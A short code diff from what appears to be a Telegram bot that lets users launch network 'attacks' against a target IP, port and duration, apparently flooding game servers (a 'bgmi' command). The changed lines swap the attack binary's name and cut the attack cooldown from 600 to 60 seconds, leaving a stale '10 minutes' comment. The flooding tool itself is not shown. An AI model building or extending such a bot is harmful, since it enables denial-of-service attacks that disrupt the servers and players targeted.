@@ -306,7 +306,7 @@ async def attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 async def start_attack(target_ip, port, duration, user_id, original_message, context):
     global active_attack
-    command = ['./xnx', target_ip, str(port), str(duration)]
+    command = ['./xxxx', target_ip, str(port), str(duration)]
 
     try:
         process = await asyncio.create_subprocess_exec(*command)
@@ -369,7 +369,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await save_user_info(user_id, username)
 
     current_time = time.time()
-    cooldown_time = 600  # Cooldown period in seconds (10 minutes)
+    cooldown_time = 60  # Cooldown period in seconds (10 minutes)
 
     # Check if an attack is already in progress
     if active_attack or user_processes:
